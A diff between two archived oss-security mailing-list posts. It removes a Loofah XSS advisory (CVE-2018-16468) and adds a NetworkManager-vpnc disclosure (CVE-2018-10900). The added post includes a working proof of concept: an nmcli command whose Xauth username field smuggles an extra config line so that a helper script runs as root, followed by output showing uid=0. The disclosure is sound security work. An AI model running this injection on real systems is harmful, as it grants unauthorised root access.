@@ -1,67 +1,61 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/30/1
-Message-ID: <CAGJbjKb8Ccxyv-JYrvXxeiyq4BvFesM4PEdgwndDxYA7KTQPiA@mail.gmail.com>
-Date: Tue, 30 Oct 2018 09:14:52 -0400
-From: Mike Dalessio <mike.dalessio@...il.com>
-To: ruby-security-ann@...glegroups.com, rubyonrails-security@...glegroups.com,  oss-security@...ts.openwall.com, loofah-talk@...glegroups.com
-Subject: [CVE-2018-16468] Loofah XSS Vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/07/20/3
+Message-ID: <c3f99b35b65fa7d78317ca62f32046eab71596b9.camel@v3.sk>
+Date: Fri, 20 Jul 2018 11:38:39 +0200
+From: Lubomir Rintel <lkundrak@...sk>
+To: oss-security@...ts.openwall.com
+Subject: CVE-2018-10900: NetworkManager-vpnc-1.2.4 local privilege escalation
 Content-Type: text/plain; charset=utf-8
 
-Hello all,
+Hi,
 
-A *medium* severity vulnerability has been identified and patched in Loofah
-v2.2.3, which is a dependency of `rails-html-sanitizer`. This issue has
-been assigned CVE-2018-16468.
+NetworkManager-vpnc-1.2.6 fixes a local authenticated root bug.
 
-The public notice can be found here:
+The bug was responsibly disclosed to us by Denis Andzakovic. Please
+credit him if you issue an advisory for a product that ships the
+affected code. His original advisory should be available soon at
+https://pulsesecurity.co.nz/advisories/NM-VPNC-Privesc
 
-    https://github.com/flavorjones/loofah/issues/154
+CVE Number: CVE-2018-10900
 
-To save you a click, I've reproduced the contents of the announcement here.
+Original Report (will be available soon):
+https://pulsesecurity.co.nz/advisories/NM-VPNC-Privesc
 
------
+Patch:
+https://gitlab.gnome.org/GNOME/NetworkManager-vpnc/commit/07ac18a32b4
 
-*# CVE-2018-16468 - Loofah XSS Vulnerability*
+Release Notes:
+https://download.gnome.org/sources/NetworkManager-vpnc/1.2/NetworkManager-vpnc-1.2.6.news
 
-This issue has been created for public disclosure of an XSS vulnerability
-that was responsibly reported (independently) by [Shubham Pathak](
-https://hackerone.com/hackedbrain) and @yasinS (Yasin Soliman).
+Patched Version:
+https://download.gnome.org/sources/NetworkManager-vpnc/1.2/NetworkManager-vpnc-1.2.6.tar.xz
 
-I'd like to thank [HackerOne](https://hackerone.com/loofah) for providing a
-secure, responsible mechanism for reporting, and for providing their
-fantastic service to the Loofah maintainers.
+The exploit code for QA and documentation purposes follows:
 
+cat <<EOF >/tmp/helper
+#!/bin/bash
+id >/tmp/pwned
+EOF
+chmod +x /tmp/helper
+nmcli c add con-name poc type vpn ifname '*' vpn-type vpnc \
++vpn.data "IKE DH Group = dh2" \
++vpn.data "IPSec ID = bar" \
++vpn.data "IPSec gateway = 127.0.0.1" \
++vpn.data "IPSec secret-flags = 4" \
++vpn.data "Local Port = 0" \
++vpn.data "NAT Traversal Mode = natt" \
++vpn.data "Perfect Forward Secrecy = server" \
++vpn.data "Vendor = cisco" \
++vpn.data "Xauth password-flags = 4" \
++vpn.data "Xauth username = foo$(echo; echo Password helper
+/tmp/helper)" \
++vpn.data "ipsec-secret-type = save" \
++vpn.data "xauth-password-type = save"
+nmcli c up poc
 
-*## Severity*
+$ cat /tmp/pwned
+uid=0(root) gid=0(root) groups=0(root)
+context=system_u:system_r:vpnc_t:s0
 
-Loofah maintainers have evaluated this as [Medium (CVSS3 6.4)](
-https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:L
-).
-
-
-*## Description*
-
-In the Loofah gem, through v2.2.2, unsanitized JavaScript may occur in
-sanitized output when a crafted SVG element is republished.
-
-
-*## Affected Versions*
-
-Loofah < v2.2.3.
-
-
-*## Mitigation*
-
-Upgrade to Loofah v2.2.3.
-
-
-*## References*
-
-* [HackerOne report](https://hackerone.com/reports/429267)
-
-
-*## History of this public disclosure*
-
-2018-10-27: disclosure created, all information is embargoed
-2018-10-30: embargo ends, full information made available
-
+Take care,
+Lubo
